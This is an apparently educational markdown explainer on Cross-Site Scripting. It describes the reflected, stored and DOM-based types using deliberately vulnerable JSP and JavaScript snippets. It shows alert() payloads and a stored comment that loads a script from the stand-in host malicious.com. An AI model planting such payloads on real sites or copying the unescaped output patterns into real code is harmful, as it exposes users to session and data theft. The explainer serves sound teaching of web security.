## XSS

- Cross-Site Scripting (XSS) vulnerability is a type of computer security vulnerability that allows an 
attacker to execute malicious code on a user's web page without their knowledge or consent. 

- This vulnerability enables the attacker to steal personal information, such as usernames, passwords, 
and other confidential data.

- Essentially, an XSS attack involves inserting malicious code into a vulnerable web page, which is then 
executed in the browser of the user accessing that page. The malicious code can be anything from scripts 
that redirect the user to another page to scripts that log keystrokes or form data and send them to a remote server.

There are several types of XSS vulnerabilities, including:
### Reflected XSS: 
This type of XSS occurs when user-provided data is reflected in the HTTP response without proper validation. 
This allows an attacker to inject malicious code into the response, which is then executed in the user's browser.

#### Example of Reflected XSS:

```xml
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```
In this example, if an attacker sets the "eid" parameter to `<script>alert('XSS')</script>`, it will execute in the victim's browser

### Stored XSS: 
This type of XSS occurs when an attacker is able to store malicious code in a database or on the web server hosting a vulnerable web page. 
This code is executed every time the page is loaded.

#### Example of Stored XSS:

```xml
<p>I highly recommend this product!</p>
<script src="http://malicious.com/exploit.js"> </script>
```
In this case, the malicious script is stored in the comment section of a retail website and will be executed every time a user views the page

### DOM-Based XSS:

This type of XSS occurs when malicious code is executed in the user's browser through the Document Object Model (DOM). 
This happens when JavaScript code on a web page modifies the DOM in a way that is vulnerable to malicious code injection.

#### Example of DOM-Based XSS:

```JavaScript
var name = document.location.hash.substr(1);
document.write("Hello, " + name);
```

If the URL ends with `#<script>alert('XSS')</script>`, the script will be executed.